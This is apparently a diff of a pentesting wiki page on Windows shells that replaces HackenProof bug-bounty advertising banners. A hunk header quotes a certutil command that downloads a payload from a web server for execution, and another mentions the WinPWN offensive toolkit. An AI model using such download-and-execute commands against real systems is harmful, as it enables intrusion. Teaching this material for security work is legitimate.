@@ -12,15 +12,22 @@
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
+**HackenProof is home to all crypto bug bounties.**
 
-🐞 Read web3 bug tutorials
+**Get rewarded without delays**\
+HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.
 
-🔔 Get notified about new bug bounties
+**Get experience in web3 pentesting**\
+Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.
 
-💬 Participate in community discussions
+**Become the web3 hacker legend**\
+Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.
+
+[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!
+
+{% embed url="https://hackenproof.com/register" %}
 
 ## Lolbas
 
@@ -324,15 +331,22 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 
 
 
-<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
+**HackenProof is home to all crypto bug bounties.**
 
-🐞 Read web3 bug tutorials
+**Get rewarded without delays**\
+HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.
 
-🔔 Get notified about new bug bounties
+**Get experience in web3 pentesting**\
+Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.
 
-💬 Participate in community discussions
+**Become the web3 hacker legend**\
+Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.
+
+[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!
+
+{% embed url="https://hackenproof.com/register" %}
 
 ## **Cscript/Wscript**
 
@@ -578,15 +592,22 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive
 
 ​
 
-<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
+**HackenProof is home to all crypto bug bounties.**
 
-🐞 Read web3 bug tutorials
+**Get rewarded without delays**\
+HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.
 
-🔔 Get notified about new bug bounties
+**Get experience in web3 pentesting**\
+Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.
 
-💬 Participate in community discussions
+**Become the web3 hacker legend**\
+Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.
+
+[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!
+
+{% embed url="https://hackenproof.com/register" %}
 
 <details>
 
